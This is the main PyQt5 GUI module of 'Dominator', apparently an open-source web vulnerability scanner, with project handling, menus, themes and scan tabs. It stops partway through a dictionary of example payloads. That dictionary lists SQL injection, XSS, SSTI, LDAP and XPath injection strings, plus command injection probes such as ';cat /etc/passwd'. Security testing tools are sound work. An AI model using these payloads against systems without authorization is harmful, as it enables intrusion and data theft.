#!/usr/bin/env python3
"""
Dominator Web Scanner - Modern GUI Interface
Professional dark-themed GUI with real-time progress tracking
"""

import sys
import os
import json
import threading
import subprocess
from datetime import datetime
from pathlib import Path

# Add parent directory to path to import scanner modules
sys.path.insert(0, str(Path(__file__).parent.parent))

# Import GUI components
from GUI.components.browser_tab import BrowserTab
from GUI.components.project_manager import ProjectStartupDialog, ProjectManager
from GUI.components.scan_wizard import ScanWizard
from GUI.components.scheduler import SchedulerManager, get_scheduler_manager, check_due_scans
from GUI.ui_tabs.scan_tab import ScanTabBuilder
from GUI.ui_tabs.advanced_tab import AdvancedTabBuilder
from GUI.ui_tabs.payloads_tab import PayloadsTabBuilder
from GUI.ui_tabs.output_tab import OutputTabBuilder
from GUI.ui_tabs.progress_tab import ProgressTabBuilder
from GUI.ui_tabs.modules_tab import ModulesTabBuilder
from GUI.ui_tabs.plugins_tab import PluginsTabBuilder
from GUI.ui_tabs.scope_tab import ScopeTabBuilder
from GUI.ui_tabs.results_tab import ResultsTabBuilder
from GUI.ui_tabs.api_testing_tab import APITestingTabBuilder
from GUI.scan_thread import ScanThread
from GUI.theme_manager import ThemeManager
from GUI.config_handler import ConfigHandler
from GUI.results_handler import ResultsHandler
from GUI.dialogs.options_dialog import OptionsDialog
from GUI.utils.message_box import show_warning, show_question, show_information
from GUI.components.widgets import CollapsibleBox

try:
    from PyQt5.QtWidgets import (
        QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
        QLabel, QLineEdit, QPushButton, QTextEdit, QComboBox, QCheckBox,
        QGroupBox, QGridLayout, QTabWidget, QFileDialog, QSpinBox,
        QProgressBar, QListWidget, QSplitter, QScrollArea, QFrame, QMessageBox,
        QListWidgetItem, QMenuBar, QAction, QMenu, QTableWidget, QTableWidgetItem,
        QHeaderView, QAbstractItemView, QActionGroup, QToolButton, QSizePolicy,
        QInputDialog
    )
    from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer, QUrl, QParallelAnimationGroup, QPropertyAnimation, QAbstractAnimation, QSize, QMutex, QMutexLocker
    from PyQt5.QtGui import QFont, QColor, QPalette, QIcon, QTextCursor, QDesktopServices
except ImportError:
    print("ERROR: PyQt5 is required for the GUI")
    print("Install with: pip install PyQt5")
    sys.exit(1)



class DominatorGUI(QMainWindow):
    """Main GUI window for Dominator scanner"""

    # Tab index constants - prevents hardcoded indices throughout the codebase
    TAB_SCAN_CONFIG = 0
    TAB_PAYLOADS = 1
    TAB_RESULTS = 2
    TAB_SCOPE = 3
    TAB_MODULES = 4
    TAB_PLUGINS = 5
    TAB_API_TESTING = 6
    TAB_BRUTEFORCE = 7
    TAB_INTERCEPTOR = 8

    def __init__(self):
        super().__init__()
        self.scan_thread = None
        self.time_update_timer = QTimer(self)  # Timer for time display updates
        self.time_update_timer.timeout.connect(self._update_scan_time)

        # Thread-safe vulnerability counts with mutex protection
        self._vuln_counts_mutex = QMutex()
        self._vuln_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}

        self.current_project_file = None  # Track current project file
        self.project_manager = ProjectManager()  # Project management
        self.theme_manager = ThemeManager(self)  # Theme management
        self.config_handler = ConfigHandler(self)  # Configuration file handling
        self.results_handler = ResultsHandler(self)  # Results/vulnerability handling

        # Performance optimization: Debug mode and output throttling
        self.debug_mode = False  # Off by default - reduces lag
        self.raw_output_mode = False  # Off by default - shows filtered output
        self._output_buffer = []  # Buffer for throttled output
        self._last_output_time = 0  # Last time output was flushed
        self._output_throttle_ms = 100  # Minimum ms between UI updates
        self._output_flush_timer = None  # Timer for flushing output buffer

        self.init_ui()
        self.theme_manager.apply_theme("light")  # Default theme - white with black text

    @property
    def vuln_counts(self):
        """Thread-safe getter for vulnerability counts"""
        with QMutexLocker(self._vuln_counts_mutex):
            return self._vuln_counts.copy()

    @vuln_counts.setter
    def vuln_counts(self, value):
        """Thread-safe setter for vulnerability counts"""
        with QMutexLocker(self._vuln_counts_mutex):
            self._vuln_counts = value

    def increment_vuln_count(self, severity):
        """Thread-safe increment of vulnerability count"""
        with QMutexLocker(self._vuln_counts_mutex):
            if severity in self._vuln_counts:
                self._vuln_counts[severity] += 1

    def get_total_vulns(self):
        """Thread-safe total vulnerability count"""
        with QMutexLocker(self._vuln_counts_mutex):
            return sum(self._vuln_counts.values())

    def show_startup_dialog(self):
        """Show project selection dialog on startup"""
        dialog = ProjectStartupDialog(self)

        # Connect signals
        dialog.new_project.connect(self.on_new_project)
        dialog.open_project.connect(self.on_open_project)
        dialog.temp_project.connect(self.on_temp_project)

        return dialog.exec_() == dialog.Accepted

    def on_new_project(self, name, path):
        """Handle new project creation"""
        self.project_manager.create_project(name, path)
        self.update_window_title()
        self.update_status_bar()
        self.output_console.append(f"[+] Created new project: {name}")
        self.output_console.append(f"    Location: {path}")
        self.output_console.append(f"    Project structure created:")
        self.output_console.append(f"    - reports/     (scan reports)")
        self.output_console.append(f"    - findings/    (vulnerability findings)")
        self.output_console.append(f"    - resources/   (discovered resources)")
        self.output_console.append(f"    - logs/        (scan logs)")

    def on_open_project(self, path):
        """Handle opening existing project"""
        self.project_manager.open_project(path)
        self.update_window_title()
        self.update_status_bar()
        self.load_project_settings()
        self.output_console.append(f"[+] Opened project: {self.project_manager.project_name}")
        self.output_console.append(f"    Location: {path}")

        # Show project info
        info = self.project_manager.get_project_info()
        scan_count = info.get('scan_count', 0)
        if scan_count > 0:
            self.output_console.append(f"    Previous scans: {scan_count}")

    def on_temp_project(self):
        """Handle temporary session"""
        self.project_manager.is_temp = True
        self.update_window_title()
        self.update_status_bar()
        self.output_console.append("Started temporary session - data will not be saved")

    def update_window_title(self):
        """Update window title with project name"""
        if self.project_manager.is_temp:
            self.setWindowTitle("Dominator Web Vulnerability Scanner - Temporary Session")
        else:
            self.setWindowTitle(f"Dominator - {self.project_manager.project_name}")

    def update_status_bar(self):
        """Update status bar with project path"""
        if self.project_manager.is_temp:
            self.statusBar().showMessage("Temporary Session - Ready to scan")
        else:
            self.statusBar().showMessage(f"Project: {self.project_manager.project_path}")

    def new_project(self):
        """Create a new project via dialog"""
        from GUI.components.project_manager import ProjectStartupDialog
        dialog = ProjectStartupDialog(self)
        dialog.new_project.connect(self.on_new_project)
        dialog.open_project.connect(self.on_open_project)
        dialog.temp_project.connect(self.on_temp_project)
        dialog.exec_()

    def open_project_dialog(self):
        """Open existing project via file dialog"""
        folder = QFileDialog.getExistingDirectory(
            self, "Select Project Folder"
        )
        if folder:
            project_file = Path(folder) / "project.json"
            if not project_file.exists():
                show_warning(
                    self, "Not a Project",
                    "The selected folder doesn't contain a Dominator project (missing project.json)."
                )
                return
            self.on_open_project(folder)
            self.update_recent_projects_menu()

    def save_project(self):
        """Save current project"""
        if self.project_manager.is_temp:
            self.save_project_as()
            return

        # Save current settings
        self.save_project_settings()

        if self.project_manager.save_project():
            self.statusBar().showMessage(f"Project saved: {self.project_manager.project_path}", 3000)
            self.output_console.append(f"[+] Project saved to: {self.project_manager.project_path}")
        else:
            show_warning(self, "Error", "Failed to save project")

    def save_project_as(self):
        """Save project to new location"""
        folder = QFileDialog.getExistingDirectory(
            self, "Select New Project Location",
            str(Path.home() / "Documents")
        )
        if not folder:
            return

        # Get project name
        name, ok = QInputDialog.getText(
            self, "Project Name",
            "Enter project name:",
            QLineEdit.Normal,
            self.project_manager.project_name or "my-project"
        )
        if not ok or not name:
            return

        project_path = str(Path(folder) / name)

        # Save current settings first
        self.save_project_settings()

        if self.project_manager.save_project_as(project_path, name):
            self.update_window_title()
            self.update_status_bar()
            self.update_recent_projects_menu()
            self.statusBar().showMessage(f"Project saved as: {project_path}", 3000)
            self.output_console.append(f"[+] Project saved as: {project_path}")
        else:
            show_warning(self, "Error", "Failed to save project")

    def export_project(self):
        """Export project as ZIP file"""
        if self.project_manager.is_temp:
            show_warning(
                self, "No Project",
                "No project to export. Please save your project first."
            )
            return

        filename, _ = QFileDialog.getSaveFileName(
            self, "Export Project",
            f"{self.project_manager.project_name}.zip",
            "ZIP Files (*.zip)"
        )
        if filename:
            result = self.project_manager.export_project(filename)
            if result:
                show_information(
                    self, "Export Complete",
                    f"Project exported to:\n{result}",
                    setting_key="info_export_complete"
                )
            else:
                show_warning(self, "Error", "Failed to export project")

    def import_project(self):
        """Import project from ZIP file"""
        filename, _ = QFileDialog.getOpenFileName(
            self, "Import Project",
            "",
            "ZIP Files (*.zip)"
        )
        if not filename:
            return

        # Select destination
        folder = QFileDialog.getExistingDirectory(
            self, "Select Import Destination",
            str(Path.home() / "Documents" / "Dominator Projects")
        )
        if not folder:
            return

        # Create project folder
        import zipfile
        with zipfile.ZipFile(filename, 'r') as zf:
            # Try to find project name from zip
            project_name = Path(filename).stem

        destination = str(Path(folder) / project_name)

        if self.project_manager.import_project(filename, destination):
            self.update_window_title()
            self.update_status_bar()
            self.load_project_settings()
            self.update_recent_projects_menu()
            show_information(
                self, "Import Complete",
                f"Project imported to:\n{destination}",
                setting_key="info_import_complete"
            )
        else:
            show_warning(self, "Error", "Failed to import project")

    def close_project(self):
        """Close current project"""
        if self.project_manager.modified:
            reply = show_question(
                self, "Save Changes?",
                "Do you want to save changes before closing?",
                QMessageBox.Yes | QMessageBox.No | QMessageBox.Cancel,
                QMessageBox.Cancel
            )
            if reply == QMessageBox.Cancel:
                return
            elif reply == QMessageBox.Yes:
                self.save_project()

        self.project_manager.close_project()
        self.update_window_title()
        self.update_status_bar()
        self.new_scan()  # Reset GUI

    def update_recent_projects_menu(self):
        """Update the recent projects submenu"""
        self.recent_projects_menu.clear()

        # Load recent projects from settings
        config_file = Path.home() / ".dominator" / "settings.json"
        if config_file.exists():
            try:
                with open(config_file) as f:
                    settings = json.load(f)

                recent = settings.get("recent_projects", [])
                for project in recent[:10]:
                    if Path(project['path']).exists():
                        action = QAction(f"{project['name']} - {project['path']}", self)
                        action.setData(project['path'])
                        action.triggered.connect(
                            lambda checked, p=project['path']: self.open_recent_project(p)
                        )
                        self.recent_projects_menu.addAction(action)
            except (json.JSONDecodeError, KeyError, IOError) as e:
                # Log error but don't crash - recent projects is non-critical
                print(f"[!] Error loading recent projects: {e}")

        if self.recent_projects_menu.isEmpty():
            no_recent = QAction("No recent projects", self)
            no_recent.setEnabled(False)
            self.recent_projects_menu.addAction(no_recent)

    def open_recent_project(self, path):
        """Open a project from the recent list"""
        if Path(path).exists():
            self.on_open_project(path)
            self.update_recent_projects_menu()
        else:
            show_warning(
                self, "Project Not Found",
                f"Project not found at:\n{path}"
            )

    def load_project_settings(self):
        """Load settings from project"""
        config = self.project_manager.get_scan_config()
        if not config:
            return

        # Load target
        if 'target' in config:
            self.target_input.setPlainText(config['target'])

        # Load modules
        if 'modules' in config:
            for module, cb in self.module_checkboxes.items():
                cb.setChecked(module in config['modules'])

        # Load other settings as needed
        if 'threads' in config:
            self.threads_spin.setValue(config['threads'])
        if 'timeout' in config:
            self.timeout_spin.setValue(config['timeout'])

    def save_project_settings(self):
        """Save current settings to project"""
        if self.project_manager.is_temp:
            return

        config = {
            'target': self.target_input.toPlainText(),
            'modules': [name for name, cb in self.module_checkboxes.items() if cb.isChecked()],
            'threads': self.threads_spin.value(),
            'timeout': self.timeout_spin.value(),
            'cookies': self.cookies_input.text(),
            'headers': self.headers_input.toPlainText()
        }
        self.project_manager.save_scan_config(config)

    def init_ui(self):
        """Initialize the user interface"""
        self.setWindowTitle("Dominator Web Vulnerability Scanner")
        self.setGeometry(100, 100, 1400, 900)
        self.setMinimumSize(1000, 700)  # Allow resizing but with minimum size

        # Create menu bar
        self.create_menu_bar()

        # Central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        main_layout.setSpacing(10)
        main_layout.setContentsMargins(15, 15, 15, 15)

        # Header removed to save space

        # Tab widget for different sections
        self.tabs = QTabWidget()
        self.tabs.setStyleSheet("""
            QTabWidget::pane {
                border: 1px solid #e0e0e0;
                background-color: #ffffff;
                border-radius: 4px;
            }
            QTabBar::tab {
                background-color: #f5f5f5;
                color: #424242;
                padding: 10px 16px;
                margin-right: 2px;
                border: 1px solid #e0e0e0;
                border-bottom: none;
                border-top-left-radius: 6px;
                border-top-right-radius: 6px;
                font-size: 12px;
                font-weight: 500;
                min-width: 80px;
            }
            QTabBar::tab:selected {
                background-color: #ffffff;
                color: #1976D2;
                font-weight: bold;
                border-bottom: 2px solid #1976D2;
            }
            QTabBar::tab:hover:!selected {
                background-color: #e3f2fd;
                color: #1565c0;
            }
            QTabBar::tab:disabled {
                color: #9e9e9e;
            }
        """)

        # Scan Configuration Tab (includes Advanced Options)
        scan_tab = self.create_scan_tab()
        self.tabs.addTab(scan_tab, "Scan Configuration")

        # Custom Payloads Tab
        payloads_tab = self.create_payloads_tab()
        self.tabs.addTab(payloads_tab, "Custom Payloads")

        # Output Tab - Create but don't add to tabs (needed for output_console widget)
        # The scan output is now shown in Results > Scan Output subtab instead
        # IMPORTANT: Store as instance variable to prevent garbage collection
        self.output_tab = self.create_output_tab()
        # self.tabs.addTab(self.output_tab, "Scan Output")  # REMOVED: Duplicate

        # Results Tab (includes Progress subtab and Scan Output subtab)
        results_tab = self.create_results_tab()
        self.tabs.addTab(results_tab, "Results")

        # Scope Tab
        scope_tab = self.create_scope_tab()
        self.tabs.addTab(scope_tab, "Scope")

        # Modules Tab
        modules_tab = self.create_modules_tab()
        self.tabs.addTab(modules_tab, "Modules")

        # Plugins Tab
        plugins_tab = self.create_plugins_tab()
        self.tabs.addTab(plugins_tab, "Plugins")

        # API Testing Tab
        api_tab = self.create_api_testing_tab()
        self.tabs.addTab(api_tab, "API Testing")

        # HTTP Form Bruteforce Tab
        from GUI.ui_tabs.bruteforce_tab import BruteforceTabBuilder
        bruteforce_builder = BruteforceTabBuilder(self, CollapsibleBox)
        bruteforce_tab = bruteforce_builder.build()
        self.bruteforce_tab_builder = bruteforce_builder
        self.tabs.addTab(bruteforce_tab, "Form Bruteforce")

        # Browser Integration Tab
        self.browser_tab = BrowserTab(main_gui=self)
        self.browser_tab.scan_page_requested.connect(self.on_scan_page_requested)
        self.tabs.addTab(self.browser_tab, "🌐 Interceptor")

        main_layout.addWidget(self.tabs)

        # Set default tab to Scan Configuration (first tab)
        self.tabs.setCurrentIndex(self.TAB_SCAN_CONFIG)

        # Status bar
        self.statusBar().showMessage("Ready to scan")
        self.statusBar().setStyleSheet("background-color: #f5f5f5; color: #4CAF50; padding: 5px; border-top: 1px solid #e0e0e0;")

    def closeEvent(self, event):
        """Handle application close - cleanup proxy and other resources"""
        # Stop any running scan and cleanup
        if self.scan_thread and self.scan_thread.isRunning():
            print("[*] Stopping running scan...")
            self.scan_thread.stop()
            self.scan_thread.wait(5000)  # Wait up to 5 seconds for graceful stop
            self._disconnect_scan_signals()

        # Stop proxy if running
        if hasattr(self, 'browser_tab') and self.browser_tab.proxy and self.browser_tab.proxy.running:
            print("[*] Shutting down proxy...")
            self.browser_tab.proxy.stop()
            print("[+] Proxy stopped")

        # Stop timers
        if hasattr(self, 'time_update_timer') and self.time_update_timer.isActive():
            self.time_update_timer.stop()
        if hasattr(self, 'scheduler_status_timer') and self.scheduler_status_timer.isActive():
            self.scheduler_status_timer.stop()
        if hasattr(self, '_output_flush_timer') and self._output_flush_timer:
            self._output_flush_timer.stop()

        # Accept the close event
        event.accept()

    def _disconnect_scan_signals(self):
        """Disconnect all scan thread signals to prevent memory leaks"""
        if not self.scan_thread:
            return

        try:
            self.scan_thread.output_signal.disconnect()
            self.scan_thread.finished_signal.disconnect()
            self.scan_thread.progress_signal.disconnect()
            self.scan_thread.vulnerability_signal.disconnect()
            self.scan_thread.vulnerability_data_signal.disconnect()
            self.scan_thread.stats_signal.disconnect()
            self.scan_thread.resource_signal.disconnect()
            self.scan_thread.scope_signal.disconnect()
            self.scan_thread.report_signal.disconnect()
            self.scan_thread.time_signal.disconnect()
        except (TypeError, RuntimeError):
            # Signals may already be disconnected
            pass

    def create_menu_bar(self):
        """Create menu bar"""
        menubar = self.menuBar()
        menubar.setStyleSheet("""
            QMenuBar {
                background-color: #f5f5f5;
                color: #333333;
                padding: 4px;
            }
            QMenuBar::item {
                background-color: transparent;
                padding: 6px 12px;
            }
            QMenuBar::item:selected {
                background-color: #4CAF50;
                color: white;
            }
            QMenu {
                background-color: #ffffff;
                color: #333333;
                border: 1px solid #e0e0e0;
            }
            QMenu::item {
                padding: 6px 30px 6px 20px;
            }
            QMenu::item:selected {
                background-color: #4CAF50;
                color: white;
            }
        """)

        # Project menu
        project_menu = menubar.addMenu("Project")

        new_project_action = QAction("New Project...", self)
        new_project_action.setShortcut("Ctrl+Shift+N")
        new_project_action.triggered.connect(self.new_project)
        project_menu.addAction(new_project_action)

        open_project_action = QAction("Open Project...", self)
        open_project_action.setShortcut("Ctrl+Shift+O")
        open_project_action.triggered.connect(self.open_project_dialog)
        project_menu.addAction(open_project_action)

        project_menu.addSeparator()

        save_project_action = QAction("Save Project", self)
        save_project_action.setShortcut("Ctrl+Shift+S")
        save_project_action.triggered.connect(self.save_project)
        project_menu.addAction(save_project_action)

        save_project_as_action = QAction("Save Project As...", self)
        save_project_as_action.triggered.connect(self.save_project_as)
        project_menu.addAction(save_project_as_action)

        project_menu.addSeparator()

        export_project_action = QAction("Export Project...", self)
        export_project_action.triggered.connect(self.export_project)
        project_menu.addAction(export_project_action)

        import_project_action = QAction("Import Project...", self)
        import_project_action.triggered.connect(self.import_project)
        project_menu.addAction(import_project_action)

        project_menu.addSeparator()

        # Recent Projects submenu
        self.recent_projects_menu = project_menu.addMenu("Recent Projects")
        self.update_recent_projects_menu()

        project_menu.addSeparator()

        close_project_action = QAction("Close Project", self)
        close_project_action.triggered.connect(self.close_project)
        project_menu.addAction(close_project_action)

        # File menu
        file_menu = menubar.addMenu("File")

        new_scan_action = QAction("New Scan", self)
        new_scan_action.setShortcut("Ctrl+N")
        new_scan_action.triggered.connect(self.new_scan)
        file_menu.addAction(new_scan_action)

        load_config_action = QAction("Load Configuration", self)
        load_config_action.setShortcut("Ctrl+O")
        load_config_action.triggered.connect(self.config_handler.load_configuration)
        file_menu.addAction(load_config_action)

        save_config_action = QAction("Save Configuration", self)
        save_config_action.setShortcut("Ctrl+S")
        save_config_action.triggered.connect(self.config_handler.save_configuration)
        file_menu.addAction(save_config_action)

        file_menu.addSeparator()

        export_results_action = QAction("Export Results", self)
        export_results_action.triggered.connect(self.config_handler.export_results)
        file_menu.addAction(export_results_action)

        file_menu.addSeparator()

        # Scan Wizard
        wizard_action = QAction("Scan Wizard...", self)
        wizard_action.setShortcut("Ctrl+W")
        wizard_action.triggered.connect(self.show_scan_wizard)
        file_menu.addAction(wizard_action)

        file_menu.addSeparator()

        exit_action = QAction("Exit", self)
        exit_action.setShortcut("Ctrl+Q")
        exit_action.triggered.connect(self.close)
        file_menu.addAction(exit_action)

        # Edit menu
        edit_menu = menubar.addMenu("Edit")

        clear_targets_action = QAction("Clear Targets", self)
        clear_targets_action.triggered.connect(self.clear_targets)
        edit_menu.addAction(clear_targets_action)

        clear_output_action = QAction("Clear Output", self)
        clear_output_action.triggered.connect(lambda: self.output_console.clear())
        edit_menu.addAction(clear_output_action)

        clear_results_action = QAction("Clear Results", self)
        clear_results_action.triggered.connect(self.results_handler.clear_results)
        edit_menu.addAction(clear_results_action)

        # View menu
        view_menu = menubar.addMenu("View")

        view_scan_tab_action = QAction("Scan Configuration", self)
        view_scan_tab_action.triggered.connect(lambda: self.tabs.setCurrentIndex(self.TAB_SCAN_CONFIG))
        view_menu.addAction(view_scan_tab_action)

        view_payloads_tab_action = QAction("Custom Payloads", self)
        view_payloads_tab_action.triggered.connect(lambda: self.tabs.setCurrentIndex(self.TAB_PAYLOADS))
        view_menu.addAction(view_payloads_tab_action)

        view_results_tab_action = QAction("Results", self)
        view_results_tab_action.triggered.connect(lambda: self.tabs.setCurrentIndex(self.TAB_RESULTS))
        view_menu.addAction(view_results_tab_action)

        view_scope_tab_action = QAction("Scope", self)
        view_scope_tab_action.triggered.connect(lambda: self.tabs.setCurrentIndex(self.TAB_SCOPE))
        view_menu.addAction(view_scope_tab_action)

        view_modules_tab_action = QAction("Modules", self)
        view_modules_tab_action.triggered.connect(lambda: self.tabs.setCurrentIndex(self.TAB_MODULES))
        view_menu.addAction(view_modules_tab_action)

        view_plugins_tab_action = QAction("Plugins", self)
        view_plugins_tab_action.triggered.connect(lambda: self.tabs.setCurrentIndex(self.TAB_PLUGINS))
        view_menu.addAction(view_plugins_tab_action)

        view_interceptor_action = QAction("Interceptor", self)
        view_interceptor_action.triggered.connect(lambda: self.tabs.setCurrentIndex(self.TAB_INTERCEPTOR))
        view_menu.addAction(view_interceptor_action)

        # Settings menu
        settings_menu = menubar.addMenu("Settings")

        notifications_action = QAction("Notifications...", self)
        notifications_action.triggered.connect(self.open_notifications_dialog)
        settings_menu.addAction(notifications_action)

        reset_warnings_action = QAction("Reset All Warnings", self)
        reset_warnings_action.triggered.connect(self.reset_all_warnings)
        settings_menu.addAction(reset_warnings_action)

        settings_menu.addSeparator()

        # Debug mode toggle - off by default for better performance
        self.debug_mode_action = QAction("Debug Mode (Verbose Output)", self)
        self.debug_mode_action.setCheckable(True)
        self.debug_mode_action.setChecked(self.debug_mode)
        self.debug_mode_action.triggered.connect(self.toggle_debug_mode)
        settings_menu.addAction(self.debug_mode_action)

        # Themes menu
        themes_menu = menubar.addMenu("Themes")

        self.theme_group = QActionGroup(self)
        self.theme_group.setExclusive(True)

        # Define themes with checkable actions
        themes = [
            ("Light", "light"),
            ("Hacker Green", "hacker_green"),
            ("Cyber Blue", "cyber_blue"),
            ("Purple Haze", "purple_haze"),
            ("Blood Red", "blood_red"),
            ("Matrix", "matrix")
        ]

        for theme_name, theme_id in themes:
            theme_action = QAction(theme_name, self)
            theme_action.setCheckable(True)
            theme_action.setData(theme_id)
            theme_action.triggered.connect(lambda checked, tid=theme_id: self.theme_manager.apply_theme(tid))
            self.theme_group.addAction(theme_action)
            themes_menu.addAction(theme_action)

            # Set Light as default
            if theme_id == "light":
                theme_action.setChecked(True)

        # Tools menu
        tools_menu = menubar.addMenu("Tools")

        scheduler_action = QAction("Scheduler...", self)
        scheduler_action.setShortcut("Ctrl+Shift+H")
        scheduler_action.triggered.connect(self.show_scheduler)
        tools_menu.addAction(scheduler_action)

        tools_menu.addSeparator()

        options_action = QAction("Options...", self)
        options_action.setShortcut("Ctrl+,")
        options_action.triggered.connect(self.show_options_dialog)
        tools_menu.addAction(options_action)

        # Scan menu - Quick access to scan types
        scan_menu = menubar.addMenu("Scan")

        # Subdomain enumeration
        subdomain_enum_action = QAction("🌐 Enumerate Subdomains", self)
        subdomain_enum_action.setShortcut("Ctrl+Shift+S")
        subdomain_enum_action.setStatusTip("Enumerate subdomains for the target domain")
        subdomain_enum_action.triggered.connect(self.run_subdomain_enumeration)
        scan_menu.addAction(subdomain_enum_action)

        subdomain_scan_action = QAction("🔍 Scan Subdomains", self)
        subdomain_scan_action.setStatusTip("Enumerate and then scan discovered subdomains")
        subdomain_scan_action.triggered.connect(self.run_subdomain_scan)
        scan_menu.addAction(subdomain_scan_action)

        scan_menu.addSeparator()

        # Subdomain takeover check
        subdomain_takeover_action = QAction("⚠️ Check Subdomain Takeover", self)
        subdomain_takeover_action.setStatusTip("Check for subdomain takeover vulnerabilities")
        subdomain_takeover_action.triggered.connect(self.run_subdomain_takeover_check)
        scan_menu.addAction(subdomain_takeover_action)

        scan_menu.addSeparator()

        # Quick scan modes
        quick_scan_action = QAction("⚡ Quick Scan (Fast Mode)", self)
        quick_scan_action.setStatusTip("Run a fast scan with minimal payloads")
        quick_scan_action.triggered.connect(self.run_quick_scan)
        scan_menu.addAction(quick_scan_action)

        profile_only_action = QAction("📋 Profile Only (No Attacks)", self)
        profile_only_action.setStatusTip("Only profile the target without sending attack payloads")
        profile_only_action.triggered.connect(self.run_profile_only_scan)
        scan_menu.addAction(profile_only_action)

        # Help menu
        help_menu = menubar.addMenu("Help")

        docs_action = QAction("Documentation", self)
        docs_action.triggered.connect(lambda: QDesktopServices.openUrl(QUrl("https://github.com/vulnz/dominator")))
        help_menu.addAction(docs_action)

        help_menu.addSeparator()

        # Debug submenu
        debug_menu = help_menu.addMenu("Debug")

        view_log_action = QAction("View Debug Log", self)
        view_log_action.triggered.connect(self.view_debug_log)
        debug_menu.addAction(view_log_action)

        clear_log_action = QAction("Clear Debug Log", self)
        clear_log_action.triggered.connect(self.clear_debug_log)
        debug_menu.addAction(clear_log_action)

        debug_menu.addSeparator()

        self.debug_mode_action = QAction("Enable Debug Mode", self)
        self.debug_mode_action.setCheckable(True)
        self.debug_mode_action.setChecked(self.debug_mode)
        self.debug_mode_action.triggered.connect(self.toggle_debug_mode)
        debug_menu.addAction(self.debug_mode_action)

        help_menu.addSeparator()

        about_action = QAction("About Dominator", self)
        about_action.triggered.connect(self.show_about)
        help_menu.addAction(about_action)

    def create_header(self):
        """Create header section"""
        header = QFrame()
        header.setFrameShape(QFrame.StyledPanel)
        header.setStyleSheet("""
            QFrame {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #1a1a2e, stop:0.5 #16213e, stop:1 #0f3460);
                border-radius: 8px;
                padding: 15px;
            }
        """)

        layout = QVBoxLayout(header)

        title = QLabel("DOMINATOR")
        title.setFont(QFont("Arial", 28, QFont.Bold))
        title.setStyleSheet("color: #00ff88; background: transparent;")
        layout.addWidget(title)

        subtitle = QLabel("Advanced Web Vulnerability Scanner | 20 Modules | OWASP Top 10")
        subtitle.setFont(QFont("Arial", 11))
        subtitle.setStyleSheet("color: #888888; background: transparent;")
        layout.addWidget(subtitle)

        return header

    def create_scan_tab(self):
        """Create scan configuration tab"""
        builder = ScanTabBuilder(self, CollapsibleBox)
        return builder.build()

    def create_advanced_tab(self):
        """Create advanced options tab"""
        builder = AdvancedTabBuilder(self, CollapsibleBox)
        return builder.build()

    def create_payloads_tab(self):
        """Create custom payloads tab"""
        builder = PayloadsTabBuilder(self, CollapsibleBox)
        return builder.build()

    def create_output_tab(self):
        """Create output tab"""
        builder = OutputTabBuilder(self, CollapsibleBox)
        return builder.build()

    def create_progress_tab(self):
        """Create Progress & Plan tab showing scan progress and time estimates"""
        builder = ProgressTabBuilder(self, CollapsibleBox)
        return builder.build()

    def create_modules_tab(self):
        """Create modules tab for viewing/editing module configs and payloads"""
        builder = ModulesTabBuilder(self, CollapsibleBox)
        return builder.build()

    def create_plugins_tab(self):
        """Create plugins tab for managing external plugins"""
        builder = PluginsTabBuilder(self, CollapsibleBox)
        return builder.build()

    def create_scope_tab(self):
        """Create scope tab with technology detection, IP info, titles, description"""
        builder = ScopeTabBuilder(self, CollapsibleBox)
        return builder.build()

    def create_results_tab(self):
        """Create results tab"""
        builder = ResultsTabBuilder(self, CollapsibleBox)
        self.results_tab_builder = builder  # Store reference for Site Tree and Debug access
        return builder.build()

    def create_api_testing_tab(self):
        """Create API Testing tab for loading and testing API specifications"""
        builder = APITestingTabBuilder(self, CollapsibleBox)
        self.api_tab_builder = builder  # Store reference for API scan access
        return builder.build()

    def toggle_module_selection(self, checked):
        """Toggle all module checkboxes when 'Select All' is clicked"""
        for cb in self.module_checkboxes.values():
            cb.setChecked(checked)  # Check all when Select All is checked, uncheck when unchecked

    def filter_modules(self, search_text):
        """Filter modules based on search text"""
        search_text = search_text.lower().strip()

        for module_name, cb in self.module_checkboxes.items():
            # Check module name and description
            name_match = search_text in module_name.lower()
            desc = self.module_descriptions.get(module_name, "")
            desc_match = search_text in desc.lower()

            # Show/hide based on match
            if search_text == "" or name_match or desc_match:
                cb.show()
            else:
                cb.hide()

    def browse_target_file(self):
        """Browse for target file"""
        filename, _ = QFileDialog.getOpenFileName(
            self, "Select Target File", "", "Text Files (*.txt);;All Files (*)"
        )
        if filename:
            self.target_file_input.setText(filename)

    def browse_payloads_file(self):
        """Browse for custom payloads file"""
        filename, _ = QFileDialog.getOpenFileName(
            self, "Select Payloads File", "", "Text Files (*.txt);;All Files (*)"
        )
        if filename:
            self.custom_payloads_file.setText(filename)
            # Auto-load the file content into the text editor
            try:
                with open(filename, 'r', encoding='utf-8') as f:
                    content = f.read()
                    self.custom_payloads_text.setPlainText(content)
            except Exception as e:
                self.output_console.append(f"[!] Error loading payloads file: {e}")

    def update_payload_count(self):
        """Update the payload count label"""
        text = self.custom_payloads_text.toPlainText()
        lines = [line.strip() for line in text.split('\n') if line.strip()]
        count = len(lines)
        self.payload_count_label.setText(f"Payloads: {count}")

    def update_payload_examples(self, module_text):
        """Update payload examples based on selected module"""
        examples = {
            "All Modules": "ℹ️ Payloads will be applied to ALL compatible modules. Use specific module selection for better control.",
            "SQL Injection (sqli)": "💡 SQL Injection Examples:\n' OR 1=1--\nadmin' --\n1' UNION SELECT NULL,NULL,NULL--\n' AND '1'='1\n1 OR 1=1",
            "Cross-Site Scripting (xss)": "💡 XSS Examples:\n<script>alert('XSS')</script>\n<img src=x onerror=alert(1)>\n'\"><script>alert(document.domain)</script>\n<svg onload=alert(1)>\n<body onload=alert(1)>",
            "Server-Side Template Injection (ssti)": "💡 SSTI Examples:\n{{7*7}}\n${7*7}\n{{config}}\n{{config.items()}}\n{{''.class.mro()[1].subclasses()}}",
            "Command Injection (cmdi)": "💡 Command Injection Examples:\n;whoami\n`whoami`\n$(whoami)\n| whoami\n& whoami\n;cat /etc/passwd",
            "LDAP Injection (ldap)": "💡 LDAP Injection Examples:\n*)(uid=*))(|(uid=*\nadmin*\n*)(|(password=*\n)(cn=*))(|(cn=*",
            "XPath Injection (xpath)": "💡 XPath Injection Examples:\n' or '1'='1\n' or 1=1 or ''='\n//*\nx' or name()='username' or 'x'='y",
